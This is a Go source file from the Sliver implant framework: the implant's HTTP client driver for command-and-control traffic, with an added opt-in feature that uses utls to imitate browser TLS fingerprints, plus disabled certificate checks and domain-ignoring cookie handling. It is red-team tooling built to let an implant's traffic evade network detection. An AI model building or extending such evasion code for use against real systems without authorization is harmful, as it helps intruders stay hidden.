package httpclient

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/proxy"
	
	// {{if .Config.EnableTLSFingerprinting}}
	utls "github.com/refraction-networking/utls"
	// {{end}}
)

// GoHTTPDriver - Pure Go HTTP driver
func GoHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, error) {
	var transport *http.Transport
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true, // We don't care about the HTTP(S) layer certs
	}
	// {{if .Config.Debug}}
	if cryptography.TLSKeyLogger != nil {
		tlsConfig.KeyLogWriter = cryptography.TLSKeyLogger
	}
	// {{end}}
	
	// TLS Fingerprinting (Milestone D - Phase 6.2)
	// Check if TLS fingerprinting is enabled via build-time configuration
	// {{if .Config.EnableTLSFingerprinting}}
	// Use utls for custom TLS fingerprinting (non-breaking, opt-in)
	if !secure {
		transport = &http.Transport{
			IdleConnTimeout:     time.Millisecond,
			Dial:                proxy.Direct.Dial,
			TLSHandshakeTimeout: opts.TlsTimeout,
			TLSClientConfig:     tlsConfig,
			// TLS fingerprinting via custom DialTLSContext
			DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				return dialWithUTLSContext(ctx, network, addr, "{{.Config.TLSFingerprint}}", opts)
			},
		}
	} else {
		transport = &http.Transport{
			IdleConnTimeout: time.Millisecond,
			Dial: (&net.Dialer{
				Timeout: opts.NetTimeout,
			}).Dial,
			TLSHandshakeTimeout: opts.TlsTimeout,
			TLSClientConfig:     tlsConfig,
			// TLS fingerprinting via custom DialTLSContext
			DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				return dialWithUTLSContext(ctx, network, addr, "{{.Config.TLSFingerprint}}", opts)
			},
		}
	}
	// {{else}}
	// Original behavior: Use standard crypto/tls (default, backward compatible)
	if !secure {
		transport = &http.Transport{
			IdleConnTimeout:     time.Millisecond,
			Dial:                proxy.Direct.Dial,
			TLSHandshakeTimeout: opts.TlsTimeout,
			TLSClientConfig:     tlsConfig,
		}
	} else {
		transport = &http.Transport{
			IdleConnTimeout: time.Millisecond,
			Dial: (&net.Dialer{
				Timeout: opts.NetTimeout,
			}).Dial,
			TLSHandshakeTimeout: opts.TlsTimeout,
			TLSClientConfig:     tlsConfig,
		}
	}
	// {{end}}
	client := &http.Client{
		Jar:       cookieJar(),
		Timeout:   opts.NetTimeout,
		Transport: transport,
	}
	parseProxyConfig(origin, transport, opts.ProxyConfig)
	return client, nil
}

func parseProxyConfig(origin string, transport *http.Transport, proxyConfig string) {
	switch proxyConfig {
	case "never":
		break
	case "":
		fallthrough
	case "auto":
		p := proxy.NewProvider("").GetHTTPSProxy(origin)
		if p != nil {
			// {{if .Config.Debug}}
			log.Printf("Found proxy %#v\n", p)
			// {{end}}
			proxyURL := p.URL()
			if proxyURL.Scheme == "" {
				proxyURL.Scheme = "https"
			}
			// {{if .Config.Debug}}
			log.Printf("Proxy URL = '%s'\n", proxyURL)
			// {{end}}
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	default:
		// {{if .Config.Debug}}
		log.Printf("Force proxy %#v\n", proxyConfig)
		// {{end}}
		proxyURL, err := url.Parse(proxyConfig)
		if err != nil {
			break
		}
		if proxyURL.Scheme == "" {
			proxyURL.Scheme = "https"
		}
		// {{if .Config.Debug}}
		log.Printf("Proxy URL = '%s'\n", proxyURL)
		// {{end}}
		transport.Proxy = http.ProxyURL(proxyURL)
	}
}

// Jar - CookieJar implementation that ignores domains/origins
type Jar struct {
	lk      sync.Mutex
	cookies []*http.Cookie
}

func cookieJar() *Jar {
	return &Jar{
		lk:      sync.Mutex{},
		cookies: []*http.Cookie{},
	}
}

// NewJar - Get a new instance of a cookie jar
func NewJar() *Jar {
	jar := new(Jar)
	jar.cookies = make([]*http.Cookie, 0)
	return jar
}

// SetCookies handles the receipt of the cookies in a reply for the
// given URL (which is ignored).
func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	jar.lk.Lock()
	jar.cookies = append(jar.cookies, cookies...)
	jar.lk.Unlock()
}

// Cookies returns the cookies to send in a request for the given URL.
// It is up to the implementation to honor the standard cookie use
// restrictions such as in RFC 6265 (which we do not).
func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
	return jar.cookies
}

// dialWithUTLSContext establishes a TLS connection using utls for fingerprinting
// This function is used when EnableTLSFingerprinting is true in the build configuration
// 
// {{if .Config.EnableTLSFingerprinting}}
func dialWithUTLSContext(ctx context.Context, network, addr, fingerprint string, opts *HTTPOptions) (net.Conn, error) {
	// Establish TCP connection
	dialer := &net.Dialer{
		Timeout:   opts.NetTimeout,
		KeepAlive: 30 * time.Second,
	}
	
	tcpConn, err := dialer.DialContext(ctx, network, addr)
	if err != nil {
		return nil, fmt.Errorf("tcp dial failed: %w", err)
	}
	
	// Extract server name for SNI
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		host = addr
	}
	
	// Configure utls
	config := &utls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
		// {{if .Config.Debug}}
		KeyLogWriter: cryptography.TLSKeyLogger,
		// {{end}}
	}
	
	// Get browser fingerprint
	var browserID utls.ClientHelloID
	switch fingerprint {
	case "chrome":
		browserID = utls.HelloChrome_Auto
	case "firefox":
		browserID = utls.HelloFirefox_Auto
	case "ios", "safari-ios":
		browserID = utls.HelloIOS_Auto
	case "android":
		browserID = utls.HelloAndroid_11_OkHttp
	case "edge":
		browserID = utls.HelloEdge_Auto
	case "safari", "safari-macos":
		browserID = utls.HelloSafari_Auto
	default:
		browserID = utls.HelloChrome_Auto // Safe default
	}
	
	// Create utls connection
	uconn := utls.UClient(tcpConn, config, browserID)
	
	// Perform handshake
	err = uconn.HandshakeContext(ctx)
	if err != nil {
		tcpConn.Close()
		return nil, fmt.Errorf("tls handshake failed: %w", err)
	}
	
	return uconn, nil
}
// {{end}}
